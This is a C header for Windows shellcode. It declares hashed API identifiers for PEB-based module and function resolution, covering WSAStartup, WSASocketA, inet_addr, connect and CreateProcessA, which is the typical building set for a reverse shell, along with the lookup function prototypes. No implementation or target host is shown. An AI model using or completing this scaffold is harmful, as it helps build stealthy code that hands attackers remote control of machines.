#ifndef SHELLCODE_H
#define SHELLCODE_H 

/* local headers */
#include "Native.h"

/* casting */
#define C_PTR( x ) ( ( PVOID )    x )
#define U_PTR( x ) ( ( UINT_PTR ) x )

/* Modules */
#define H_MODULE_NTDLL    ( 0x70e61753 )
#define H_MODULE_KERNEL32 ( 0xadd31df0 )

/* Functionns */
#define H_API_WSASTARTUP   	0x142e89c3
#define H_API_LOADLIBRARYA 	0xb7072fdb
#define H_API_WSASOCKETA 	0x8a4d8fa
#define H_API_HTONS 		0xd454eb1
#define H_API_INET_ADDR 	0xafe73c2f
#define H_API_CONNECT 		0xe73478ef
#define H_API_CREATEPROCESSA 	0xfbaf90b9

/* Memory & String functions */
#define MemCopy __builtin_memcpy
#define MemSet  __stosb
#define MemZero RtlSecureZeroMemory

VOID Main(
  VOID
);

PVOID LdrModulePeb(
  _In_ ULONG Hash
);

PVOID LdrFunctionAddr(
  _In_ PVOID Module,
  _In_ ULONG Function
);

#endif // SHELLCODE_H
